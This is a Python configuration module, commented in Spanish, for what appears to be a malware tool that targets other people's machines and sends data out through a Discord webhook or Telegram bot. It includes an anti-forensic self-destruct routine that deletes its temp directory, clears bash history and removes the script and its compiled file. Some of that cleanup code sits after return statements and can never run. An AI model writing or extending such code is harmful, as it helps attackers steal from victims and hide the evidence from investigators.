#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
config.py
- Carga el .env y expone las variables de configuración globales.
- No contiene lógica de negocio, solo constantes y verificación de requests.
"""

from dotenv import load_dotenv  # Cargar el .env
load_dotenv()                   # Leer el .env

import os
import sys
import traceback
import shutil
import time

# ============================================================
#                    VERIFICACIÓN DE REQUESTS
# ============================================================
# Verifica si la librería 'requests' está instalada.
# Si no está, el script se autodestruye (ver Requests_NOT).
# ============================================================
print("[DEBUG] === VERIFICANDO REQUESTS ===")
try:
    import requests  # PROCURE QUE SU OBJECTIVO TENGA REQUESTS EN SU SISTEMA
    REQUESTS_DISPONIBLE = True
    print("[+] Requests SI esta disponible")
    print(f"[DEBUG] Versión de requests: {requests.__version__}")
except ImportError:
    REQUESTS_DISPONIBLE = False
    print("[!] Requests NO esta disponible")


def Requests_NOT(fallo, temp_dir, script_path):
    """
    Si requests NO está disponible, elimina rastros y se autodestruye.
    Si SÍ está disponible, retorna False y el flujo continúa.
    """
    try:
        try:
            if not REQUESTS_DISPONIBLE:
                raise ImportError(" Requests no esta disponible")
            print("[DEBUG] Requests verificado correctamente (global)")
            return False
        except ImportError:
            print("[!] Error: requests no está instalado.")
            print("[!] Instala manualmente con: pip install --user requests")
            print("[!] O con: sudo pip install requests (si tienes permisos)")
            return True

        # 1. Eliminar el directorio temporal
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
            print(f"[+] Eliminado: {temp_dir}")

            # 2. Limpiar historial de bash
            os.system('history -c 2>/dev/null')
            os.system('history -w 2>/dev/null')
            os.system('cat /dev/null > ~/.bash_history 2>/dev/null')

            # 3. Eliminar el script
            time.sleep(1)
            if os.path.exists(script_path):
                os.remove(script_path)
                print(f"[+] Eliminado: {script_path}")

            # 4. Eliminar cualquier archivo .pyc
            pyc_file = f"{script_path}c"
            if os.path.exists(pyc_file):
                os.remove(pyc_file)

            print("[+] Autodestrucción completada")
            sys.exit(0)

    except Exception as e:
        print(f"[!] Error en autodestrucción: {e}")
        traceback.print_exc()
        return True


# ============================================================
#                  CONFIGURACIÓN GLOBAL
# ============================================================
# Define las variables de configuración globales.
# ============================================================
VERSION = "v5.0.5"

# --- Discord ---
DISCORD_WEBHOOK_URL = os.getenv("API_Discord")

# --- Telegram ---
TELEGRAM_BOT_TOKEN = os.getenv("TOKEN_TL")
TELEGRAM_CHAT_ID = os.getenv("CHAT_ID")

# --- Comportamiento ---
MAX_SIZE_MB = 8
AUTODESTRUIR = False
SOPORTE_CHROME = False
TRANSPORT_ACTIVO = os.getenv("TRANSPORT", "discord").lower()  # "discord" o "telegram"

# Validación mínima: al menos el transporte elegido debe tener credenciales.
if TRANSPORT_ACTIVO == "discord" and not DISCORD_WEBHOOK_URL:
    raise ValueError("No hay API de Discord en .env")
if TRANSPORT_ACTIVO == "telegram" and (not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID):
    raise ValueError("Faltan TOKEN_TL o CHAT_ID en .env")